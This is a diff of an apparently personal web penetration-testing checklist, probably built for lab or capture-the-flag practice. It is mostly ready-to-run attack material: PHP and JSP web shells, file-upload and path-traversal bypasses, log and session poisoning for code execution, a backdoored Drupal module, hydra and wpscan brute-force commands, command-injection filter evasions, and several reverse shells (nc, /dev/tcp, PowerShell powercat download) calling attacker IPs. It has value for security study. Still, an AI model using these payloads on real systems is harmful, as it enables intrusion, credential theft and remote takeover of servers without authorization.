@@ -1,27 +1,31 @@
 # HTTP Checklist
 
-1. Fingerprint with Nmap, then run script to enumerate further
+#### Fingerprint with Nmap, then run script to enumerate further
 ```bash
 sudo nmap -p80 --script=http-enum $ip
 ```
 #### Analyze tech stack with Wappalyzer
 
 #### Fuzzing directories and files
-```bash
-# /opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt
-gobuster dir -u http://$url:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
-wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://$url:50000/FUZZ/"
-wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$url/FUZZ"
-gobuster dir -u $url -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -erk -t 30 -x php,txt,html,whatever
 
-# If you get hits, try to discover more directories using a smaller wordlist
+```bash
+# /opt/SecLists/Discovery/Web-Content/megadirlow.txt
+gobuster dir -u http://$url:9000 -w /opt/SecLists/Discovery/Web-Content/megadir.txt -k -t 30
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/megadirlow.txt --hc 404 "http://$url:50000/FUZZ/"
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$url/FUZZ"
+gobuster dir -u $url -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -erk -t 30 -x php,txt,html,whatever
+feroxbuster -k -u $url:3000 -o feroxbuster.out -w /opt/SecLists/Discovery/Web-Content/megadir.txt -b "connect.sid=s%3Awy8r5K11MKvRQ7w5lr8QS9KyHJr_q92B.2fbWC6h%2FH6u7sCs06k4dwmYRTFkdvhy%2BdwOjxLaufwA; userLevel=YWRtaW4%3d"
+ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
+
+# If you get hits, try to discover more directories using a more niche wordlist
 
 # IIS Additional Fuzzing
 java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt # If iis_.. returned TRANSF~1.ASP
+gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
 cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
-ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
 /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt
-feroxbuster -k -u $url:3000 -o feroxbuster.out -w /opt/SecLists/Discovery/Web-Content/megadir.txt -b "connect.sid=s%3Awy8r5K11MKvRQ7w5lr8QS9KyHJr_q92B.2fbWC6h%2FH6u7sCs06k4dwmYRTFkdvhy%2BdwOjxLaufwA; userLevel=YWRtaW4%3d"
 ```
 
 #### Fuzzing Subdomains & vhosts
@@ -60,6 +64,7 @@ ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwor
 
 # Fuzzing directly in URL, in this case, testing for parameters.
 ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ffuf -k -u https://streamio.htb/admin/?FUZZ=1 -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 
 # If you need to be authorized/logged in
 ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
@@ -87,10 +92,52 @@ curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url"
 curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}'$url:13337/update
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
-gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
+gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/megadir.txt -p apis
 # Start testing with curl for ssti.
 curl -si --data "code=1+1" # {7*7}...
 curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
+```
+
+#### Interacting with APIs
+
+```bash
+curl $url/api.php/city/london 	# Read entry
+curl -s $url/api.php/city/ \| jq #	Read all entries
+curl -X POST $url/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' #	Create (add) entry
+curl -X PUT $url/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' #	Update (modify) entry
+curl -X DELETE $url/api.php/city/New_HTB_City #	Delete entry
+```
+
+#### Curl
+
+```bash
+curl -s -O inlanefreight.com/index.html #	Download file
+curl -k https://inlanefreight.com #	Skip HTTPS (SSL) certificate validation
+curl -i https://www.inlanefreight.com #	Print response headers and response body
+curl -u admin:admin $url/ #	Set HTTP basic authorization credentials
+curl http://admin:admin@$ip:$port/ #	Pass HTTP basic authorization credentials in the URL
+curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' $url/ # Set request header
+curl -X POST -d 'username=admin&password=admin' $url/ #	Send POST request with POST data
+curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' $url/ #	Set request cookies
+curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' $url/search.php #	Send POST request with JSON data
+```
+
+#### Ffuf
+
+```bash
+ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u $url/index/FUZZ #	Extension Fuzzing
+ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt:FUZZ -u $url/blog/FUZZ.php #	Page Fuzzing
+ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt:FUZZ -u $url/FUZZ -recursion -recursion-depth 1 -e .php -v #	Recursive Fuzzing
+ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/ #	Sub-domain Fuzzing
+ffuf -w wordlist.txt:FUZZ -u $url/ -H 'Host: FUZZ.academy.htb' -fs xxx #	VHost Fuzzing
+ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php?FUZZ=key -fs xxx #	Parameter Fuzzing - GET
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php -X POST -d 'FUZZ=id' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Parameter Fuzzing - POST
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Parameter Fuzzing - POST
+ffuf -w ids.txt:FUZZ -u $url/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Value Fuzzing
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u '$url/index.php?FUZZ=value' -fs 2287 #	Fuzz page parameters
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u '$url/index.php?language=FUZZ' -fs 2287 #	Fuzz LFI payloads
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u '$url/index.php?language=../../../../FUZZ/index.php' -fs 2287 #	Fuzz webroot path
+ffuf -w ./LFI-WordList-Linux:FUZZ -u '$url/index.php?language=../../../../FUZZ' -fs 2287 #	Fuzz server configurations
 ```
 
 #### Nikto
@@ -135,6 +182,12 @@ gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins
 gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -t 10 --exclude-length 6
 ```
 
+Brute force login.
+
+```bash
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
+
 Malicious plugin.
 
 - Go to admin page > Plugins --> Add New
@@ -143,6 +196,66 @@ Malicious plugin.
 
 ```bash
 python console.py -t $url/wordpress
+```
+
+Or go to theme editor, insert php webshell code and go crazy.
+
+Money file is "wp-config.php".
+
+Login.
+
+```bash
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+```
+
+#### Joomla
+
+- Fingerprint version from README.txt file, or from javascript files in "media/system/js/" directory, or navigating to "administrator/manifests/files/joomla.xml", "plugins/system/cache/cache.xml"
+
+```bash
+droopescan scan joomla --url http://dev.inlanefreight.local/
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
+- If logged in, customize template and insert webshell code
+
+#### Drupal
+
+```bash
+droopescan scan drupal -u http://drupal.inlanefreight.local
+```
+
+PHP Filter Module.
+
+- If pre-V8, enable php filter module -> go to content -> add content & create basic page.
+- Make sure Text format is PHP code
+- If post-V8, go to updates -> install -> and upload the module yourself "https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz"
+
+```bash
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```
+
+Backdoored module.
+
+```bash
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+# Create a PHP web shell with the contents
+<?php
+system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
+?>
+# Create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+# The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+# Manage -> extend -> + Install new module -> upload
 ```
 
 #### Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
@@ -187,6 +300,7 @@ joomscan --ec -u $RHOST:$RPORT_HTTP
 
 ```bash
 ~!@#$%^&*()-_+={}][|\`,./?;:'"<>
+${{<%[%'"}}%\. # SSTI, didn't know where to put
 ```
 
 - If our input is being added between div tags, we'll need to include our own script tags4 and need to be able to inject "<" and ">" as part of the payload
@@ -223,7 +337,7 @@ echo BASE64_ENCODED_STRING | base64 -d
 
 #### Directory Traversal
 
-- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../"
+- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../". DO THISS THIS SHTISITHSIT .
 
 - If there's something like "https://example.com/cms/login.php?language=en.html", then try to navigate to the file directly with "https://example.com/cms/en.html". If you can, this confirms that en.html is a file on the server and it may be vulnerable to something like "http://example.com/subdir/index.php?page=../../../../../../../../../etc/passwd"
 
@@ -258,6 +372,18 @@ wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfi
 wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csam.old -O SAM
 ```
 
+```bash
+/index.php?language=/etc/passwd #	Basic LFI
+/index.php?language=../../../../etc/passwd #	LFI with path traversal
+/index.php?language=/../../../etc/passwd #	LFI with name prefix
+/index.php?language=./languages/../../../../etc/passwd #	LFI with approved path
+/index.php?language=....//....//....//....//etc/passwd #	Bypass basic path traversal filter
+/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 #	Bypass filters with URL encoding
+/index.php?language=non_existing_directory/../../../etc/passwd/./././. # [./ REPEATED ~2048 times] 	Bypass appended extension with path truncation (obsolete)
+/index.php?language=../../../../etc/passwd%00 #	Bypass appended extension with null byte (obsolete)
+/index.php?language=php://filter/read=convert.base64-encode/resource=config # or config.php, Read PHP with base64 filter
+```
+
 #### Log Poisoning / Local File Inclusion
 
 - RCE (PHP) through log poisoning (likely /var/log/apache2/access.log). See if you can read the file and see what contents are stored (i.e. User-Agent):
@@ -278,6 +404,14 @@ GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ```
 
 ..if something else, do something else.
+
+```bash
+/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd #	Read PHP session parameters
+/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E #	Poison PHP session with web shell
+/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id #	RCE through poisoned PHP session
+curl -s "$url/index.php" -A '<?php system($_GET["cmd"]); ?>' #	Poison server log
+/index.php?language=/var/log/apache2/access.log&cmd=id #	RCE through poisoned PHP session
+```
 
 #### PHP Wrappers
 
@@ -301,6 +435,13 @@ curl "http://example.com/subdir/index.php?page=data://text/plain;base64,PD9waHAg
 php://filter/read=convert.base64-encode/resource=index.php
 ```
 
+```bash
+/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id #	RCE with data wrapper
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "$url/index.php?language=php://input&cmd=id" #	RCE with input wrapper
+curl -s "$url/index.php?language=expect://id" #	RCE with expect wrapper
+```
+
+
 #### Remote File Inclusion
 
 - If the website is loading files or contents from remote systems, then RFI may be possible. You can go into Developer Tools to discover this in source, etc.
@@ -318,69 +459,60 @@ view=C:/windows/system32/drivers/etc/hosts
 view=//$myip/test/share
 ```
 
+```bash
+http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
+```
+
 #### File Upload Vulns (Executable)
+
+File signatures: "https://en.wikipedia.org/wiki/List_of_file_signatures"
+ASP Upload: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP"
+PHP Extensions: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst"
 
 THINK ABOUT RCE WHENEVER YOU HAVE LFI.
 
 THINK ABOUT LOCAL FILE INCLUSION.
 
-
-For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.
-
-```bash
-http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
-```
-
-You can upload as cmd.jpg then intercept and switch to cmd.jpg.php.
-
+- For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.
+- You can upload as cmd.jpg then intercept and switch to cmd.jpg.php & cmd.php.jpg.
 - Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.
-
 - Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
+- Try to inject characters before, after extension, "%20, %0a, %00, %0d0a, /, .\, ."
 
 ```bash
-#!/bin/sh
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
 echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
 ```
 
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif #	Create malicious image
+```
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php #	Create malicious zip archive 'as jpg'
+/index.php?language=zip://shell.zip%23shell.php&cmd=id #	RCE with malicious uploaded zip
+```
+
 - Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.
-
 - See if you can intercept and modify the files, naming the php file shell.txt initially, then changing it to shell.php.
-
 - With Windows, replace php with aspx in the examples if you don't know what to use.
-
 - If you're able to upload a simple webshell, then see if you can execute commands:
+- Inspect website image to try and uncover directory, modify accepted extensions, or even remove the check
+- Try to modify content type to 'image/jpg', 'image/jpeg', 'image/png', 'image/gif'
 
 ```bash
 curl http://example.com/meteor/subdir/simple-backdoor.pHP?cmd=dir
 ```
+
 Here's a crazy good resource for a high level gauntlet of what you can do, "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload".
 
 If you can, then get a reverse shell with powershell (>-<):
 
 ```bash
-kali@kali:~$ pwsh
-PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-
-
-PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-
-PS> $EncodedText =[Convert]::ToBase64String($Bytes)
-
-PS> $EncodedText
-JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
-...
-PS> exit
-kali@kali:~$ nc -nvlp 4444
 kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...
 ```
 
 - See if you can overwrite files, such as authorized_keys. Worst case, you may get information about the web stack
-
-```bash
-echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
-echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
-```
 
 #### Bypassing File Upload Extension with Phar
 
@@ -396,14 +528,30 @@ mv test.phar test.jpeg
 GET /?page=phar://uploads/test.jpeg/reverse
 ```
 
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg #	Create malicious phar 'as jpg'
+/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id #	RCE with malicious uploaded phar
+```
+
 #### Uploading "GIF"
 
 If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists.
+
+Also try "GIF87a"
 
 ```bash
 GIF89a;
 <?php system($_GET["cmd"]); ?>
 ```
+
+#### Fuzzing Extensions with Burp
+
+- Intercept POST request -> Sniper
+- Put squiglies around file$.php$
+- Run with extensions from "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst"
+
+- Same
+- Run with extensions from "https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" to see what extensions are whitelisted
 
 #### File Upload Vulns (Non-Executable)
 
@@ -420,7 +568,112 @@ kali@kali:~$ cat keyname.pub > authorized_keys
 
 Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.
 
+#### File Inclusion Functions
+
+```bash
+#              Read Content | Execute | Remote URL
+## PHP 			
+include()/include_once() 	Y 	Y 	Y
+require()/require_once() 	Y 	Y 	X
+file_get_contents() 	    Y 	X 	Y
+fopen()/file() 	            Y 	X 	X
+## NodeJS 			
+fs.readFile() 	            Y 	X 	X
+fs.sendFile() 	            Y 	X 	X
+res.render() 	            Y 	Y 	X
+## Java 			
+include 	                Y 	X 	X
+import 	                    Y 	Y 	Y
+## .NET 			
+@Html.Partial() 	        Y   X   X
+@Html.RemotePartial() 	    Y 	X 	Y
+Response.WriteFile() 	    Y 	X 	X
+include 	                Y 	Y 	Y
+```
+
+#### Remote URL ^^ -> Host Your Own Webshell
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server 80 #	Host web shell
+/index.php?language=http://$myip/shell.php&cmd=id #	Include remote PHP web shell
+```
+
+#### Try to Intercept Inject Username with Reset Password Functionality
+
 #### OS Command Injection
+
+Commands.
+
+```bash
+; 	%3b #	Both
+\n 	%0a #	Both
+& 	%26 #	Both (second output generally shown first)
+| 	%7c #	Both (only second output is shown)
+&& 	%26%26 #	Both (only if first succeeds)
+|| 	%7c%7c #	Second (only if first fails)
+`command` 	%60%60 #	Both (Linux-only)
+$(command) 	%24%28%29 #	Both (Linux-only)
+```
+
+Filtered Character Bypass (Linux).
+
+```bash
+printenv #	Can be used to view all environment variables
+# Spaces 	
+%09 #	Using tabs instead of spaces
+${IFS} #	Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())
+{ls,-la} #	Commas will be replaced with spaces
+#Other Characters 	
+${PATH:0:1} #	Will be replaced with /
+${LS_COLORS:10:1} #	Will be replaced with ;
+$(tr '!-}' '"-~'<<<[) #	Shift character by one ([ -> \)
+```
+
+Filtered Character Bypass (Windows).
+
+```bash
+Get-ChildItem Env: #	Can be used to view all environment variables - (PowerShell)
+# Spaces 	
+%09 #	Using tabs instead of spaces
+%PROGRAMFILES:~10,-5% #	Will be replaced with a space - (CMD)
+$env:PROGRAMFILES[10] #	Will be replaced with a space - (PowerShell)
+# Other Characters 	
+%HOMEPATH:~0,-17% #	Will be replaced with \ - (CMD)
+$env:HOMEPATH[0] #	Will be replaced with \ - (PowerShell)
+```
+
+Blacklisted Command Bypass (Linux).
+
+```bash
+# Character Insertion 	
+' or " #	Total must be even'
+$@ or \ #	Linux only
+# Case Manipulation 	
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #	Execute command regardless of cases
+$(a="WhOaMi";printf %s "${a,,}") #	Another variation of the technique
+# Reversed Commands 	
+echo 'whoami' | rev #	Reverse a string
+$(rev<<<'imaohw') #	Execute reversed command
+# Encoded Commands 	
+echo -n 'cat /etc/passwd | grep 33' \| base64 #	Encode a string with base64
+bash<<<$(base64 -d<<<ZWNobyBoZWxsbw==) #	Execute b64 encoded string
+```
+
+Blacklisted Command Bypass (Windows).
+
+```bash
+# Character Insertion 	
+' or " #	Total must be even'
+^ #	Windows only (CMD)
+# Case Manipulation 	
+WhoAmi 	Simply send the character with odd cases
+# Reversed Commands 	
+"whoami"[-1..-20] -join '' #	Reverse a string
+iex "$('imaohw'[-1..-20] -join '')" #	Execute reversed command
+# Encoded Commands 	
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) #	Encode a string with base64
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" #	Execute b64 encoded string
+```
 
 If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:
 
@@ -436,20 +689,41 @@ nc -lvnp 4444
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
 
+#### Web Roots
+
+Linux.
+
 ```bash
-& command
-&& command
-; command
-command %0A command
-| command
-|| command
-`command`
-$(command)
+/var/www/html/
+/var/www/
+/var/www/app/
+/var/www/sites/
+/var/www/public/
+/var/www/public_html/
+/var/www/html/default/
+/srv/www/
+/srv/www/html/
+/srv/www/sites/
+/home/www/
+/home/httpd/
+/home/$USER/public_html/
+/home/$USER/www/
+/home/$USER/app/
+/home/$USER/$application_name/
+/var/www/$application_name/
+```
+
+Windows.
+
+```bash
+c:\inetpub\wwwroot\
+c:\xampp\htdocs\
+c:\wamp\www
 ```
 
 #### SQL Injection
 
-- Refer to ./sqli.md
+- Refer to ./sqli.md. Try the authentication bypass fuzzing.
 
 #### Client-Side Attacks
 
@@ -502,6 +776,12 @@ Note that it sends the payload non-url-encoded.
 
 #### Bruteforcing Logins
 
+Basic auth.
+
+```bash
+hydra -L wordlist.txt -P wordlist.txt -u -f $ip -s $port http-get /
+```
+
 Popup Logins.
 
 ```bash
@@ -511,6 +791,9 @@ hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-get
 Webapp Login Brute.
 
 ```bash
+# Third parameter can be F=html_content or S=html_content, F is inferred
+hydra -l admin -P wordlist.txt -f $ip -s $port http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+hydra -V -f -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt -s 80 $ip http-post-form "/index.php:username=^USER^&password=^PASS^:Login failed"
 hydra -V -f -l $user -P /usr/share/wordlists/rockyou.txt -s $port $ip http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
 hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 ```
@@ -535,6 +818,114 @@ hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:
 
 ```bash
 python tomcat-login.py -H $ip -P http -m /manager/html -p 8080
+```
+
+Structure.
+
+```bash
+├── bin
+├── conf
+│   ├── catalina.policy
+│   ├── catalina.properties
+│   ├── context.xml
+│   ├── tomcat-users.xml
+│   ├── tomcat-users.xsd
+│   └── web.xml
+├── lib
+├── logs
+├── temp
+├── webapps # Default webroot & hosts applications
+│   ├── manager
+│   │   ├── images
+│   │   ├── META-INF
+│   │   └── WEB-INF
+|   |       └── web.xml
+│   └── ROOT
+│       └── WEB-INF
+└── work
+    └── Catalina
+        └── localhost
+
+webapps/customapp
+├── images
+├── index.jsp
+├── META-INF
+│   └── context.xml
+├── status.xsd
+└── WEB-INF
+    ├── jsp
+    |   └── admin.jsp
+    └── web.xml # the juice
+    └── lib
+    |    └── jdbc_drivers.jar
+    └── classes # check for sensitive information
+        └── AdminServlet.class   
+```
+
+Upload war file.
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
+```
+
+You can also place a JSP webshell within the archive.
+
+```bash
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp
+```
+
+#### Jenkins
+
+Exploits are often version specific. 
+
+In the left sidebar, navigate to "Manage Jenkins" > "Script Console", or just go to $rhost:8080/script.
+
+```bash
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+```bash
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+
+Replace cmd.exe with /bin/bash if needed.
+
+```bash
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+Code execution.
+
+```bash
+def proc = "id".execute();
+def os = new StringBuffer();
+proc.waitForProcessOutput(os, System.err);
+println(os.toString());
+```
+
+On local machine.
+
+```bash
+stty raw -echo; (echo 'script -qc "/bin/bash" /dev/null';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp 80 && reset
+```
+
+Decrypt Jenkins secrets from Groovy.
+
+```bash
+println(hudson.util.Secret.decrypt("{...}"))
+```
+
+Password spraying.
+
+```bash
+python /opt/jenkins_password_spraying.py
 ```
 
 #### Exposed Git Repo from URL
@@ -591,6 +982,10 @@ _method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTz
